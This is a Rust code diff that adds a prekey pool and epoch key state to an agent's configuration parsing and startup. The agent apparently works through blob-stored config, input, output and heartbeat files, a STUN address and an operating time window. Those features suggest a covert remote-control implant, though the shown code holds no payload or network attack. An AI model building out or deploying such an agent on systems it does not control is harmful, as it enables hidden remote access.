@@ -37,6 +37,7 @@ struct AgentCfg {
     pub_key_b64:     String,
     stun_ip:         String,
     session_key_hex: String,
+    prekey_pool_b64: String,
 }
 
 pub fn run() {
@@ -83,7 +84,7 @@ fn try_blob() -> Option<AgentCfg> {
 }
 
 fn parse_cfg(data: &str) -> Option<AgentCfg> {
-    let p: Vec<&str> = data.splitn(9, '|').collect();
+    let p: Vec<&str> = data.splitn(10, '|').collect();
     if p.len() < 9 { return None; }
     Some(AgentCfg {
         folder_path:     p[0].to_string(),
@@ -95,6 +96,7 @@ fn parse_cfg(data: &str) -> Option<AgentCfg> {
         pub_key_b64:     p[6].to_string(),
         stun_ip:         p[7].to_string(),
         session_key_hex: p[8].to_string(),
+        prekey_pool_b64: p.get(9).unwrap_or(&"").to_string(),
     })
 }
 
@@ -135,9 +137,15 @@ fn start_agent(cfg: AgentCfg, t: &transport::SharedTransport) {
         .map(|p| p.display().to_string())
         .unwrap_or_default();
 
+    let prekey_pool = crate::epoch::decode_prekey_pool(&cfg.prekey_pool_b64);
+    let agent_id = crate::epoch::derive_agent_id(&session_key);
+    let epoch_blob = format!("{}.epoch", BLOB_PATH);
+    let mut epoch_state = crate::restore_or_bootstrap_epoch(&epoch_blob, &prekey_pool, &session_key, &agent_id);
+
     crate::run_loop(
         &info, &start_cwd, &pub_key, &session_key, t, &state,
         &cfg.folder_path, &cfg.input_file, &cfg.output_file, &cfg.heartbeat_file,
         BLOB_PATH, WINDOW_START, WINDOW_END,
+        &mut epoch_state, &prekey_pool, &agent_id,
     );
 }
